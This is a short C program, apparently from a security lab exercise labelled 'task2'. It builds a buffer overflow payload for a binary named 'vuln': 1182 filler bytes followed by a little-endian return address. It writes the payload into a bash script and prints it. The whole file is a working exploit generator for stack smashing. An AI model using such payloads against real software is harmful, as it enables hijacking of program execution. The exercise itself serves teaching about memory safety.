#include<stdio.h>

int main()
{
    char c = '1';
    char s[4] = {'\x36', '\x92', '\x04', '\x08'};

    FILE *fptr;
    fptr = fopen("task2_.sh", "w");

    fprintf(fptr, "#!/usr/bin/env bash\n");
    fprintf(fptr, "/task2/template/vuln ");
    for (int i = 0; i < 1178 + 4; i++)
        fprintf(fptr,"%c", c);
    fprintf(fptr, "%s", s);


    for (int i = 0; i < 1178 + 4; i++)
        printf("%c", c);
    printf("%s", s);

    return 0;
}